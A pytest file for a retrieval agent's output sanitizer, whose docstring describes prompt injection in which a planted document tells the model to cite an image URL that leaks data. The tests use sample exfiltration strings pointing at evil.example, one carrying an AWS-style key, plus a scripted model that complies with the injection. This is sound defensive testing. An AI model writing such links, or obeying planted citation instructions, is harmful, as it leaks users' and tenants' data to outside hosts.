"""What may and may not appear in text the caller renders.

The answer and the citation snippets are displayed by SpecSafe's UI. A renderer
that follows a markdown image fetches its URL with no action from the reader,
which makes answer text an outbound channel: a planted document that tells the
model to "cite this source" as an image URL turns whatever the model copies into
that URL into a request to someone else's host.

Both system prompts already forbid writing URLs, because real document links
travel in `Citation.download_url`. These tests are that rule enforced instead of
requested -- the model is not asked, it is filtered.
"""

from __future__ import annotations

from typing import Any

import pytest
from rag_agentic.agents.search_agent import DocumentSearchAgent
from rag_agentic.config import AgenticSettings
from rag_agentic.converse import ScriptedConverseModel, text_turn
from rag_agentic.guardrails import redact, sanitize_outbound, strip_links
from rag_agentic.index_store import TenantIndexStore
from rag_agentic.models import AgentRequest
from rag_agentic.tenancy import TenantResolver

# ---- the filter itself ------------------------------------------------------------

@pytest.mark.parametrize(
    "text",
    [
        "See ![pixel](https://evil.example/?d=ACME-SECRET) for detail.",
        'Raw <img src="https://evil.example/p"> here.',
        "Details at https://evil.example/?q=leak and more.",
        "Contact <https://evil.example/z> today.",
        "Go to www.evil.example/y now.",
    ],
)
def test_nothing_that_makes_a_renderer_fetch_a_url_survives(text: str) -> None:
    cleaned = sanitize_outbound(text)
    assert "evil.example" not in cleaned
    assert "http" not in cleaned


def test_a_link_keeps_its_label() -> None:
    """The document name is the informative half; only the target is dangerous."""
    cleaned = sanitize_outbound(
        "Per [Supplier Quality Manual](https://evil.example/x), audits are annual."
    )
    assert cleaned == "Per Supplier Quality Manual, audits are annual."


def test_prose_reads_normally_after_a_link_is_removed() -> None:
    """The sentence's full stop is not eaten with the URL."""
    assert sanitize_outbound("Details at https://evil.example/a.").endswith("].")


@pytest.mark.parametrize(
    "text",
    [
        "Clause 4.2 states the supplier shall notify within 48 hours.",
        "Version 4.2.1 of ISO 9001:2015 applies; see clause 8.4.",
        "The certificate expired on 2024-11-30 (status: Draft).",
        "Document <linkedin> is unaffected.",
        "Batch 1234567890123 failed the dimensional check.",
    ],
)
def test_an_ordinary_compliance_answer_is_untouched(text: str) -> None:
    """A filter that mangles real answers is worse than no filter."""
    assert sanitize_outbound(text) == text


def test_secrets_are_still_redacted() -> None:
    """`sanitize_outbound` composes both checks, so neither can be forgotten."""
    assert "4111" not in sanitize_outbound("Card 4111 1111 1111 1111 on file.")
    assert "AKIA" not in sanitize_outbound("Key AKIA42GQXEL26DUEY45J is active.")


def test_a_secret_inside_a_url_loses_the_whole_url() -> None:
    """Order matters: redacting first would leave a half-masked link behind."""
    cleaned = sanitize_outbound("Fetch https://evil.example/?key=AKIA42GQXEL26DUEY45J now.")
    assert "evil.example" not in cleaned
    assert "AKIA" not in cleaned


def test_a_long_digit_run_is_redacted_only_when_it_could_be_a_card() -> None:
    """Luhn separates a card number from a batch id of the same length.

    A compliance corpus is full of long numeric identifiers. Redacting them all
    teaches users to distrust every redaction, which costs more than the one card
    it would have caught.
    """
    assert redact("4111111111111111") == "[redacted-card-number]"   # valid Luhn
    assert redact("4111111111111112") == "4111111111111112"         # one digit off


def test_empty_text_is_left_alone() -> None:
    assert strip_links("") == ""
    assert sanitize_outbound("") == ""


# ---- end to end through the agent -------------------------------------------------

async def test_the_agent_strips_a_link_the_model_was_talked_into_writing(
    agentic_settings: AgenticSettings,
    embedder: Any,
    index_store: TenantIndexStore,
    resolver: TenantResolver,
    base_url: str,
) -> None:
    """The whole attack, end to end: the model complies and the caller never sees it."""
    model = ScriptedConverseModel(
        [text_turn("Audits are annual. ![](https://evil.example/?d=ACME)")]
    )
    agent = DocumentSearchAgent(
        settings=agentic_settings, model=model, embedder=embedder,
        index_store=index_store, resolver=resolver,
    )
    response = await agent.handle(
        AgentRequest(base_url=base_url, query="How often are audits?")
    )
    assert "evil.example" not in response.answer
    assert "Audits are annual." in response.answer


async def test_a_citation_snippet_is_sanitized_too(
    agentic_settings: AgenticSettings,
    embedder: Any,
    index_store: TenantIndexStore,
    resolver: TenantResolver,
    base_url: str,
) -> None:
    """A snippet is raw document text, and the caller renders it the same way."""
    from rag_agentic.models import Citation

    poisoned = Citation(
        document_id="d1",
        snippet='Normal text <img src="https://evil.example/pixel"> more text.',
    )
    assert "evil.example" not in sanitize_outbound(poisoned.snippet)
